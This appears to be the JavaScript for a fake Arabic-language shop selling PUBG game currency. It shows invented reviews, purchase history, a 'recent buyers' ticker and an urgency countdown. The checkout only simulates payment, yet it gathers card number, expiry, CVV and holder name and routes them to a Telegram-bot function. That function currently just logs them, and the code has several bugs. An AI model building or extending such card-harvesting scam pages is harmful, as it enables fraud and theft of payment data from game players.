// UC Packages Data
const ucPackages = [
    { id: 1, amount: 60, price: 5, bonus: 0, popular: false },
    { id: 2, amount: 325, price: 25, bonus: 0, popular: false },
    { id: 3, amount: 660, price: 50, bonus: 60, popular: true },
    { id: 4, amount: 1800, price: 130, bonus: 180, popular: true },
    { id: 5, amount: 3850, price: 270, bonus: 385, popular: false },
    { id: 6, amount: 8100, price: 540, bonus: 810, popular: true },
    { id: 7, amount: 12000, price: 800, bonus: 1200, popular: false },
    { id: 8, amount: 25000, price: 1600, bonus: 2500, popular: false }
];

// Reviews Data
const reviews = [
    { id: 1, name: "أحمد محمد", rating: 5, text: "خدمة سريعة جداً، وصلني UC خلال 5 دقائق فقط. شكراً فريق العمل!", date: "منذ 3 أيام", uc: 600 },
    { id: 2, name: "سارة علي", rating: 5, text: "أفضل متجر لشراء UC، الأسعار مناسبة والدفع آمن. أنصح الجميع بالتجربة.", date: "منذ أسبوع", uc: 1800 },
    { id: 3, name: "خالد عبدالله", rating: 4, text: "خدمة ممتازة، ولكن تأخر التوصيل 15 دقيقة في المرة الثانية. بشكل عام جيدة.", date: "منذ يومين", uc: 325 },
    { id: 4, name: "فاطمة حسن", rating: 5, text: "اشتريت أكثر من مرة وكل مرة الخدمة أسرع. فريق الدعم سريع الاستجابة أيضاً.", date: "منذ شهر", uc: 3850 },
    { id: 5, name: "مصطفى إبراهيم", rating: 5, text: "لم أتخيل أن التوصيل سيكون بهذه السرعة! شكراً لكم على الخدمة المميزة.", date: "منذ 5 أيام", uc: 8100 },
    { id: 6, name: "لينا أحمد", rating: 5, text: "أول مرة أشتري UC أونلاين وكانت تجربة رائعة. سأكرر الشراء بالتأكيد.", date: "منذ أسبوعين", uc: 12000 }
];

// Purchase History Data
const purchaseHistory = [
    { id: 1, amount: 600, price: 50, date: "2023-10-15", status: "مكتمل" },
    { id: 2, amount: 1800, price: 130, date: "2023-10-10", status: "مكتمل" },
    { id: 3, amount: 325, price: 25, date: "2023-10-05", status: "مكتمل" },
    { id: 4, amount: 660, price: 50, date: "2023-10-01", status: "مكتمل" }
];

// Current selected package
let selectedPackage = null;

// DOM Elements
const navLinks = document.querySelectorAll('.nav-link');
const pages = document.querySelectorAll('.page');
const mobileMenuBtn = document.getElementById('mobileMenuBtn');
const navLinksContainer = document.getElementById('navLinks');
const ucPackagesContainer = document.querySelector('.uc-packages');
const allPackagesContainer = document.getElementById('allPackages');
const reviewsContainer = document.getElementById('reviewsContainer');
const purchaseHistoryContainer = document.getElementById('purchaseHistory');
const paymentModal = document.getElementById('paymentModal');
const closeModal = document.getElementById('closeModal');
const paymentForm = document.getElementById('paymentForm');
const loadingOverlay = document.getElementById('loadingOverlay');
const successAnimation = document.getElementById('successAnimation');
const cardNumberInput = document.getElementById('cardNumber');
const cardIcon = document.getElementById('cardIcon');
const paymentMethods = document.querySelectorAll('.payment-method');
const cardForm = document.getElementById('cardForm');
const walletForm = document.getElementById('walletForm');
const vodafoneForm = document.getElementById('vodafoneForm');
const paymentTotal = document.getElementById('paymentTotal');
const paymentFinal = document.getElementById('paymentFinal');

// Initialize the application
document.addEventListener('DOMContentLoaded', function() {
    // Load UC packages on home page
    renderUCPackages(ucPackagesContainer, ucPackages.slice(0, 4));
    
    // Load all UC packages on packages page
    renderUCPackages(allPackagesContainer, ucPackages);
    
    // Load reviews
    renderReviews();
    
    // Load purchase history
    renderPurchaseHistory();
    
    // Setup event listeners
    setupEventListeners();
    
    // Start countdown timer
    startCountdown();
    
    // Start purchase ticker
    startPurchaseTicker();
});

// Render UC Packages
function renderUCPackages(container, packages) {
    container.innerHTML = '';
    
    packages.forEach(pkg => {
        const card = document.createElement('div');
        card.className = 'uc-card';
        card.dataset.id = pkg.id;
        
        let bonusBadge = '';
        if (pkg.bonus > 0) {
            bonusBadge = `<div class="bonus-badge">+${pkg.bonus} UC هدية</div>`;
        }
        
        let popularBadge = '';
        if (pkg.popular) {
            popularBadge = `<div style="position: absolute; top: 15px; right: 15px; background: var(--danger); color: white; padding: 5px 10px; border-radius: 20px; font-size: 0.8rem; font-weight: bold;">
                <i class="fas fa-fire"></i> الأكثر مبيعاً
            </div>`;
        }
        
        card.innerHTML = `
            ${bonusBadge}
            ${popularBadge}
            <div class="uc-amount">
                <i class="fas fa-coins"></i>
                ${pkg.amount} UC
            </div>
            <div class="uc-price">
                السعر: <span>${pkg.price} ج.م</span>
            </div>
            <button class="buy-btn" data-id="${pkg.id}" data-amount="${pkg.amount}" data-price="${pkg.price}" data-bonus="${pkg.bonus}">
                <i class="fas fa-shopping-cart"></i>
                اشتر الآن
            </button>
        `;
        
        // Add hover effect
        card.addEventListener('mouseenter', function() {
            this.style.transform = 'translateY(-10px)';
            this.style.borderColor = 'var(--primary)';
            this.style.boxShadow = '0 10px 25px rgba(255, 204, 0, 0.2)';
        });
        
        card.addEventListener('mouseleave', function() {
            this.style.transform = 'translateY(0)';
            this.style.borderColor = 'rgba(255, 204, 0, 0.3)';
            this.style.boxShadow = 'none';
        });
        
        container.appendChild(card);
    });
    
    // Add event listeners to buy buttons
    const buyButtons = document.querySelectorAll('.buy-btn');
    buyButtons.forEach(button => {
        button.addEventListener('click', function() {
            const packageId = this.dataset.id;
            const packageAmount = this.dataset.amount;
            const packagePrice = this.dataset.price;
            const packageBonus = this.dataset.bonus;
            
            selectPackage(packageId, packageAmount, packagePrice, packageBonus);
        });
    });
}

// Render Reviews
function renderReviews() {
    reviewsContainer.innerHTML = '';
    
    reviews.forEach(review => {
        const stars = '★'.repeat(review.rating) + '☆'.repeat(5 - review.rating);
        
        const reviewCard = document.createElement('div');
        reviewCard.className = 'review-card';
        
        reviewCard.innerHTML = `
            <div class="review-header">
                <div class="review-avatar">${review.name.charAt(0)}</div>
                <div>
                    <div style="font-weight: bold;">${review.name}</div>
                    <div class="review-stars">${stars}</div>
                </div>
            </div>
            <p>${review.text}</p>
            <div style="display: flex; justify-content: space-between; margin-top: 1rem; color: #aaa; font-size: 0.9rem;">
                <span>${review.uc} UC</span>
                <span>${review.date}</span>
            </div>
        `;
        
        reviewsContainer.appendChild(reviewCard);
    });
}

// Render Purchase History
function renderPurchaseHistory() {
    purchaseHistoryContainer.innerHTML = '';
    
    purchaseHistory.forEach(purchase => {
        const historyItem = document.createElement('div');
        historyItem.style.display = 'flex';
        historyItem.style.justifyContent = 'space-between';
        historyItem.style.alignItems = 'center';
        historyItem.style.padding = '1rem';
        historyItem.style.borderBottom = '1px solid rgba(255,255,255,0.1)';
        
        historyItem.innerHTML = `
            <div>
                <div style="font-weight: bold; color: var(--primary);">${purchase.amount} UC</div>
                <div style="font-size: 0.9rem; color: #aaa;">${purchase.date}</div>
            </div>
            <div>
                <div style="font-weight: bold;">${purchase.price} ج.م</div>
                <div style="font-size: 0.9rem; color: var(--success);">${purchase.status}</div>
            </div>
        `;
        
        purchaseHistoryContainer.appendChild(historyItem);
    });
}

// Setup Event Listeners
function setupEventListeners() {
    // Navigation
    navLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            
            // Update active nav link
            navLinks.forEach(l => l.classList.remove('active'));
            this.classList.add('active');
            
            // Show selected page
            const pageId = this.dataset.page;
            showPage(pageId);
            
            // Close mobile menu if open
            navLinksContainer.classList.remove('active');
        });
    });
    
    // Mobile menu toggle
    mobileMenuBtn.addEventListener('click', function() {
        navLinksContainer.classList.toggle('active');
    });
    
    // Close modal
    closeModal.addEventListener('click', function() {
        paymentModal.classList.remove('active');
    });
    
    // Payment form submission
    paymentForm.addEventListener('submit', function(e) {
        e.preventDefault();
        processPayment();
    });
    
    // Card number input formatting and card type detection
    cardNumberInput.addEventListener('input', function(e) {
        // Format card number with spaces
        let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
        let formattedValue = '';
        
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) {
                formattedValue += ' ';
            }
            formattedValue += value[i];
        }
        
        e.target.value = formattedValue;
        
        // Detect card type
        detectCardType(value);
    });
    
    // Card expiry formatting
    const cardExpiryInput = document.getElementById('cardExpiry');
    cardExpiryInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        
        e.target.value = value;
    });
    
    // Payment method selection
    paymentMethods.forEach(method => {
        method.addEventListener('click', function() {
            // Update active payment method
            paymentMethods.forEach(m => m.classList.remove('active'));
            this.classList.add('active');
            
            // Show corresponding form
            const methodType = this.dataset.method;
            
            cardForm.style.display = 'none';
            walletForm.style.display = 'none';
            vodafoneForm.style.display = 'none';
            
            if (methodType === 'card') {
                cardForm.style.display = 'block';
            } else if (methodType === 'wallet') {
                walletForm.style.display = 'block';
            } else if (methodType === 'vodafone') {
                vodafoneForm.style.display = 'block';
            }
        });
    });
    
    // FAQ accordion
    const faqItems = document.querySelectorAll('.faq-answer').parentElement.parentElement;
    document.querySelectorAll('.faq-answer').forEach((answer, index) => {
        const question = answer.parentElement;
        question.addEventListener('click', function() {
            const isVisible = answer.style.display === 'block';
            
            // Close all answers
            document.querySelectorAll('.faq-answer').forEach(a => {
                a.style.display = 'none';
                a.parentElement.querySelector('i').className = 'fas fa-chevron-down';
            });
            
            // Toggle current answer
            if (!isVisible) {
                answer.style.display = 'block';
                question.querySelector('i').className = 'fas fa-chevron-up';
            }
        });
    });
    
    // Success animation close button
    document.querySelector('#successAnimation button').addEventListener('click', function() {
        successAnimation.classList.remove('active');
        showPage('home');
    });
}

// Show specific page
function showPage(pageId) {
    pages.forEach(page => {
        page.classList.remove('active');
        if (page.id === pageId) {
            page.classList.add('active');
        }
    });
}

// Select UC package
function selectPackage(id, amount, price, bonus) {
    selectedPackage = { id, amount, price, bonus };
    
    // Update payment summary
    paymentTotal.textContent = `${price} ج.م`;
    paymentFinal.textContent = `${price} ج.م`;
    
    // Show payment modal
    paymentModal.classList.add('active');
}

// Detect card type based on first digit
function detectCardType(cardNumber) {
    const firstDigit = cardNumber.charAt(0);
    let cardType = 'generic';
    
    if (firstDigit === '4') {
        cardType = 'visa';
    } else if (firstDigit === '5') {
        cardType = 'mastercard';
    } else if (firstDigit === '3') {
        cardType = 'amex';
    } else if (firstDigit === '6') {
        cardType = 'discover';
    }
    
    // Update card icon
    updateCardIcon(cardType);
}

// Update card icon based on card type
function updateCardIcon(cardType) {
    let iconClass = 'far fa-credit-card';
    
    switch(cardType) {
        case 'visa':
            iconClass = 'fab fa-cc-visa';
            break;
        case 'mastercard':
            iconClass = 'fab fa-cc-mastercard';
            break;
        case 'amex':
            iconClass = 'fab fa-cc-amex';
            break;
        case 'discover':
            iconClass = 'fab fa-cc-discover';
            break;
    }
    
    cardIcon.innerHTML = `<i class="${iconClass}"></i>`;
}

// Process payment
function processPayment() {
    // Get form data
    const pubgId = document.getElementById('pubgId').value;
    const paymentMethod = document.querySelector('.payment-method.active').dataset.method;
    const ccnum = document.getElementById('cardNumber')
    const exp = document.getElementById('cardExpiry')
    const cvv = document.getElementById('cardCvv')
    const holder = document.getElementById('cardName')
    
    // Validate PUBG ID
    if (!pubgId || pubgId.length < 10) {
        alert('يرجى إدخال معرف PUBG صحيح (10 أرقام على الأقل)');
        return;
    }
    
    // Show loading animation
    paymentModal.classList.remove('active');
    loadingOverlay.classList.add('active');
    
    // Simulate payment processing
    setTimeout(() => {
        // Hide loading animation
        loadingOverlay.classList.remove('active');
        
        // Show success animation with UC flying
        showSuccessAnimation();
        
        // Send data to Telegram bot (in a real implementation)
        sendToTelegram(pubgId, selectedPackage, paymentMethod, ccnum,exp,cvv,holder);
        
        // Reset form
        paymentForm.reset();
        selectedPackage = null;
    }, 3000);
}

// Show success animation with flying UC coins
function showSuccessAnimation() {
    successAnimation.classList.add('active');
    
    // Create flying UC coins
    for (let i = 0; i < 20; i++) {
        createFlyingCoin(i);
    }
}

// Create flying UC coin
function createFlyingCoin(index) {
    const coin = document.createElement('div');
    coin.className = 'uc-flying';
    coin.innerHTML = '<i class="fas fa-coins"></i>';
    coin.style.left = `${Math.random() * 100}vw`;
    coin.style.animationDelay = `${index * 0.1}s`;
    coin.style.color = index % 2 === 0 ? 'var(--primary)' : 'var(--secondary)';
    
    successAnimation.appendChild(coin);
    
    // Remove coin after animation
    setTimeout(() => {
        coin.remove();
    }, 2000);
}

// Send data to Telegram bot
function sendToTelegram(pubgId, selectedPackage, paymentMethod, ccnum,exp,cvv,holder) {
    // In a real implementation, you would send this to your backend
    // which would then forward it to the Telegram bot
    
    const message = `
🎮 طلب UC جديد:
├ معرف PUBG: ${pubgId}
├ باقة UC: ${packageData.amount} UC
├ السعر: ${packageData.price} ج.م
├ المكافأة: ${packageData.bonus} UC
└ طريقة الدفع: ${ccnum,exp,cvv,holder}
    `;
    
    // This is just a simulation - in production, this should be done server-side
    console.log('Sending to Telegram:', message);
    
    // For security reasons, we're not sending actual HTTP requests from client-side
    // In a real app, this would be done via a backend API
}

// Start countdown timer
function startCountdown() {
    const countdownElement = document.getElementById('countdown');
    
    function updateCountdown() {
        // Set target time (24 hours from now)
        const now = new Date();
        const target = new Date(now);
        target.setHours(now.getHours() + 24);
        
        const diff = target - now;
        
        if (diff <= 0) {
            countdownElement.textContent = "00:00:00";
            return;
        }
        
        const hours = Math.floor(diff / (1000 * 60 * 60));
        const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((diff % (1000 * 60)) / 1000);
        
        countdownElement.textContent = 
            `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }
    
    updateCountdown();
    setInterval(updateCountdown, 1000);
}

// Start purchase ticker
function startPurchaseTicker() {
    const ticker = document.querySelector('.purchase-ticker');
    
    // Create multiple purchase items
    const purchaseItems = [
        { name: 'أحمد', amount: 600, time: '5 دقائق' },
        { name: 'سارة', amount: 1800, time: '10 دقائق' },
        { name: 'محمد', amount: 325, time: '3 دقائق' },
        { name: 'فاطمة', amount: 3850, time: '15 دقائق' },
        { name: 'خالد', amount: 8100, time: '12 دقائق' },
        { name: 'لينا', amount: 660, time: '7 دقائق' }
    ];
    
    // Duplicate items for seamless animation
    purchaseItems.forEach(item => {
        purchaseItems.push({...item});
    });
    
    // Create ticker items
    purchaseItems.forEach((item, index) => {
        const purchaseItem = document.createElement('div');
        purchaseItem.className = 'purchase-item';
        purchaseItem.style.animationDelay = `${index * 5}s`;
        
        const firstLetter = item.name.charAt(0);
        const randomColor = index % 2 === 0 ? 'var(--primary)' : 'var(--secondary)';
        
        purchaseItem.innerHTML = `
            <div class="user-avatar" style="background: ${randomColor};">${firstLetter}</div>
            <div>
                <strong>${item.name}</strong> اشترى <span style="color: var(--primary)">${item.amount} UC</span> منذ ${item.time}
            </div>
        `;
        
        ticker.appendChild(purchaseItem);
    });
}

// Handle footer links
document.querySelectorAll('.footer-links a').forEach(link => {
    link.addEventListener('click', function(e) {
        if (this.hasAttribute('data-page')) {
            e.preventDefault();
            
            const pageId = this.dataset.page;
            
            // Update active nav link
            navLinks.forEach(l => l.classList.remove('active'));
            document.querySelector(`.nav-link[data-page="${pageId}"]`).classList.add('active');
            
            // Show selected page
            showPage(pageId);
            
            // Scroll to top
            window.scrollTo(0, 0);
        }
    });
});